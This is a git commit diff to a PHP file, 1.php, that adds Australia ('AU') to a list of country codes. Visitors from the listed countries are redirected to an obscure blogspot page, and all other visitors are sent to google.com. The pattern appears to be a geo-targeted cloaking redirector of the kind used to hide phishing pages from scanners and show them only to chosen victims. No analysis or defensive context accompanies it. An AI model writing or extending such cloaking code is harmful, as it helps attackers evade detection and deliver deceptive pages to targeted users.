ab92f2da2b6b14dcafed4284decc3ec637a3e45b
drive4dz <76058977+drive4dz@users.noreply.github.com>
2020-12-19 20:44:10 +0100

    Update 1.php

--- 1.php
+++ 1.php
@@ -7,6 +7,7 @@ $ok = 0;
 //if($dd == 'IE') {$ok = 1;}
 if($dd == 'DZ') {$ok = 1;}
 if($dd == 'BE') {$ok = 1;}
+if($dd == 'AU') {$ok = 1;}
 
 if($ok == '1') {$ok = "https://foridmotin.blogspot.com/ol/jziu.html";}else{$ok = "https://google.com";}
 
